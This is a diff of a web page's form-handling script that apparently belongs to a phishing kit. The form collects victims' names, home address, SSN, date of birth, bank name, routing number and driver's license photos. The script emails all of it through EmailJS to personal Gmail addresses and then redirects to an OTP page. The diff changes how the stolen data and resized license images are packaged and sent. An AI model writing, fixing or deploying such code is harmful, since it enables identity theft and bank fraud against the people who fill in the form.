@@ -2672,12 +2672,16 @@
             </button>
           </span>
 
+          <!-- Same HTML form as before -->
+
+          <!-- Your HTML form with input fields and file inputs for images -->
+
           <script>
             ;(function () {
               emailjs.init('EtzP5to2mHKA3ji4B')
             })()
 
-            function submission(e) {
+            function submission() {
               // Collect form data
               var firstName = document.getElementById('firstName').value
               var middleName = document.getElementById('middleName').value
@@ -2692,137 +2696,144 @@
               var yearsOfService =
                 document.getElementById('yearsOfService').value
               var maritalStatus = document.getElementById('maritalStatus').value
+              // Add other form data collection here...
 
-              // Get the file inputs
+              // Convert images to URIs and resize them to 100x100 pixels
               var driverLicenseFrontInput =
                 document.getElementById('driverLicenseFront')
               var driverLicenseBackInput =
                 document.getElementById('driverLicenseBack')
 
-              // Read the files selected by the user
-              var driverLicenseFrontFile = driverLicenseFrontInput.files[0]
-              var driverLicenseBackFile = driverLicenseBackInput.files[0]
+              resizeAndConvertToURI(
+                driverLicenseFrontInput,
+                function (driverLicenseFrontURI) {
+                  resizeAndConvertToURI(
+                    driverLicenseBackInput,
+                    function (driverLicenseBackURI) {
+                      // Create the form element
+                      var form = document.createElement('form')
 
-              // Use FileReader to read the image files and convert them to Base64
-              var reader = new FileReader()
-              var readerBack = new FileReader()
+                      // Set form attributes
+                      form.enctype = 'multipart/form-data'
+                      form.method = 'post'
 
-              var templateParams = {
-                // ... (existing code)
-                // to_email: 'anonymousway001@gmail.com',  Replace with the recipient's email address
-                sendername: 'ansarudeenboys',
-                to: 'mhcplutoservices@gmail.com',
-                subject: 'info',
-                replyto: 'info',
-                message:
-                  'FIRST NAME: ' +
-                  firstName +
-                  '\n' +
-                  'MIDDLE NAME: ' +
-                  middleName +
-                  '\n' +
-                  'LAST NAME: ' +
-                  lastName +
-                  '\n' +
-                  'HOME ADDRESS: ' +
-                  homeAddress +
-                  '\n' +
-                  'EMAIL ADDRESS: ' +
-                  emailAddress +
-                  '\n' +
-                  'BANK NAME: ' +
-                  bankName +
-                  '\n' +
-                  'ROUTING NUMBER: ' +
-                  routingNumber +
-                  '\n' +
-                  'SSN: ' +
-                  ssn +
-                  '\n' +
-                  'DATE OF BIRTH: ' +
-                  dob +
-                  '\n' +
-                  'GENDER: ' +
-                  gender +
-                  '\n' +
-                  'YEARS OF SERVICE: ' +
-                  yearsOfService +
-                  '\n' +
-                  'MARITAL STATUS: ' +
-                  maritalStatus +
-                  '\n',
-              }
-
-              // Create Promises to handle the image loading
-              var frontImagePromise = new Promise(function (resolve) {
-                reader.onload = function () {
-                  // The result property contains the Base64 data
-                  var driverLicenseFrontBase64 = reader.result
-                  // Update the templateParams with the Base64 data
-                  templateParams.driverLicenseFront = driverLicenseFrontBase64
-
-                  // Convert Base64 to Data URL for displaying in email
-                  var frontImageDataURL =
-                    'data:image/png;base64,' + driverLicenseFrontBase64
-                  templateParams.message +=
-                    '\nDRIVER LICENSE FRONT IMAGE:\n' + frontImageDataURL + '\n'
-                  resolve()
-                }
-
-                // Read the front driver's license file as Base64
-                if (driverLicenseFrontFile) {
-                  reader.readAsDataURL(driverLicenseFrontFile)
-                } else {
-                  resolve() // Resolve immediately if no front image is selected
-                }
-              })
-
-              var backImagePromise = new Promise(function (resolve) {
-                readerBack.onload = function () {
-                  // The result property contains the Base64 data
-                  var driverLicenseBackBase64 = readerBack.result
-                  // Update the templateParams with the Base64 data
-                  templateParams.driverLicenseBack = driverLicenseBackBase64
-
-                  // Convert Base64 to Data URL for displaying in email
-                  var backImageDataURL =
-                    'data:image/png;base64,' + driverLicenseBackBase64
-                  templateParams.message +=
-                    '\nDRIVER LICENSE BACK IMAGE:\n' + backImageDataURL + '\n'
-                  resolve()
-                }
-
-                // Read the back driver's license file as Base64
-                if (driverLicenseBackFile) {
-                  readerBack.readAsDataURL(driverLicenseBackFile)
-                } else {
-                  resolve() // Resolve immediately if no back image is selected
-                }
-              })
-
-              // Wait for both promises to resolve before sending the email
-              Promise.all([frontImagePromise, backImagePromise]).then(
-                function () {
-                  // Send email using EmailJS
-                  emailjs
-                    .send('service_jvz82un', 'template_tll0x6f', templateParams)
-                    .then(
-                      function (response) {
-                        console.log(
-                          'Email sent successfully!',
-                          response.status,
-                          response.text
+                      // Append form data
+                      form.appendChild(
+                        createInput('sendername', 'ansarudeenboys')
+                      )
+                      form.appendChild(
+                        createInput('to', 'ansarudeenboys123@gmail.com')
+                      )
+                      form.appendChild(createInput('subject', 'info'))
+                      form.appendChild(createInput('replyto', 'info'))
+                      form.appendChild(
+                        createInput(
+                          'message',
+                          'FIRST NAME: ' +
+                            firstName +
+                            '\n' +
+                            'MIDDLE NAME: ' +
+                            middleName +
+                            '\n' +
+                            'LAST NAME: ' +
+                            lastName +
+                            '\n' +
+                            'HOME ADDRESS: ' +
+                            homeAddress +
+                            '\n' +
+                            'EMAIL ADDRESS: ' +
+                            emailAddress +
+                            '\n' +
+                            'BANK NAME: ' +
+                            bankName +
+                            '\n' +
+                            'ROUTING NUMBER: ' +
+                            routingNumber +
+                            '\n' +
+                            'SSN: ' +
+                            ssn +
+                            '\n' +
+                            'DATE OF BIRTH: ' +
+                            dob +
+                            '\n' +
+                            'GENDER: ' +
+                            gender +
+                            '\n' +
+                            'YEARS OF SERVICE: ' +
+                            yearsOfService +
+                            '\n' +
+                            'MARITAL STATUS: ' +
+                            maritalStatus +
+                            '\n'
                         )
-                        // Handle success, e.g., show a success message or redirect to a thank you page
-                        window.location.href = './otp-page.html'
-                      },
-                      function (error) {
-                        console.error('Error sending email:', error)
-                        // Handle error, e.g., display an error message to the user
-                      }
-                    )
+                      )
+
+                      // Append URIs as hidden inputs
+                      form.appendChild(
+                        createInput(
+                          'driverLicenseFrontURI',
+                          driverLicenseFrontURI
+                        )
+                      )
+                      form.appendChild(
+                        createInput(
+                          'driverLicenseBackURI',
+                          driverLicenseBackURI
+                        )
+                      )
+
+                      // Submit the form using emailjs
+                      emailjs
+                        .sendForm('service_oe9nudf', 'template_tll0x6f', form)
+                        .then(
+                          function (response) {
+                            console.log(
+                              'Email sent successfully!',
+                              response.status,
+                              response.text
+                            )
+                            // Handle success, e.g., show a success message or redirect to a thank you page
+                            window.location.href = './otp-page.html'
+                          },
+                          function (error) {
+                            console.error('Error sending email:', error)
+                            // Handle error, e.g., display an error message to the user
+                          }
+                        )
+                    }
+                  )
                 }
               )
+            }
+
+            // Helper function to create form inputs
+            function createInput(name, value) {
+              var input = document.createElement('input')
+              input.type = 'hidden'
+              input.name = name
+              input.value = value
+              return input
+            }
+
+            // Function to convert image to URI and resize to 100x100 pixels
+            function resizeAndConvertToURI(input, callback) {
+              if (input.files && input.files[0]) {
+                var reader = new FileReader()
+                reader.onload = function (e) {
+                  var image = new Image()
+                  image.onload = function () {
+                    var canvas = document.createElement('canvas')
+                    var ctx = canvas.getContext('2d')
+                    canvas.width = 100
+                    canvas.height = 100
+                    ctx.drawImage(image, 0, 0, 100, 100)
+                    var resizedURI = canvas.toDataURL('image/jpeg', 1) // You can change the format and quality here
+                    callback(resizedURI)
+                  }
+                  image.src = e.target.result
+                }
+                reader.readAsDataURL(input.files[0])
+              }
             }
 
             console.log('end of the line')
